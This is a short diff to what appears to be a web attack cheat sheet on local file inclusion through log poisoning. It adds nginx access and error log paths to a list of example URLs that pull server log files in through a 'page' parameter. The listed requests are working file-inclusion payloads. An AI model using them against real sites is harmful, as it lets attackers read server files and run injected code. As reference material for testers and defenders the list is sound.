@@ -253,6 +253,8 @@ Just append your PHP code into the log file by doing a request to the service (A
 ```powershell
 http://example.com/index.php?page=/var/log/apache/access.log
 http://example.com/index.php?page=/var/log/apache/error.log
+http://example.com/index.php?page=/var/log/nginx/access.log
+http://example.com/index.php?page=/var/log/nginx/error.log
 http://example.com/index.php?page=/var/log/vsftpd.log
 http://example.com/index.php?page=/var/log/sshd.log
 http://example.com/index.php?page=/var/log/mail
